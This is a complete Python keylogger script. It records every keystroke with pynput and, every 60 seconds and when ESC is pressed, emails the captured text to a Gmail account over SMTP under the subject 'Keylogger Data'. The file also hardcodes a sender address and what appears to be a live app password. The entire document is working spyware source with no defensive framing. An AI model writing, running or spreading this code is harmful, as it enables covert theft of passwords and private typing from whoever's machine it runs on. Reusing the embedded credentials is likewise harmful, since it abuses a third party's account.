from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
import threading

# --- Email configuration ---
EMAIL_ADDRESS = "sanaaakadam@gmail.com"        # Sender email
EMAIL_PASSWORD = "lpqt keke dptb ikpb"              # Sender password (use app password if 2FA enabled)
RECEIVER_EMAIL = "sanaaakadam@gmail.com"      # Receiver email
SEND_INTERVAL = 60  # seconds

# --- Log buffer ---
log_buffer = ""

# --- Send email ---
def send_email(log):
    if not log:
        return
    try:
        msg = MIMEText(log)
        msg['Subject'] = 'Keylogger Data'
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = RECEIVER_EMAIL

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)
        print("[+] Email sent.")
    except Exception as e:
        print(f"[!] Email error: {e}")

# --- Send periodically ---
def send_periodically():
    global log_buffer
    if log_buffer:
        send_email(log_buffer)
        log_buffer = ""
    threading.Timer(SEND_INTERVAL, send_periodically).start()

# --- Record keystrokes ---
def on_press(key):
    global log_buffer
    try:
        log_buffer += key.char
    except AttributeError:
        if key == key.space:
            log_buffer += ' '
        elif key == key.enter:
            log_buffer += '\n'
        elif key == key.esc:
            print("[*] ESC pressed. Stopping keylogger.")
            send_email(log_buffer)  # Final send
            return False  # Stop listener
        else:
            log_buffer += f' [{key.name}] '

# --- Start ---
if __name__ == "__main__":
    print("[*] Keylogger running... Press ESC to stop.")
    send_periodically()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
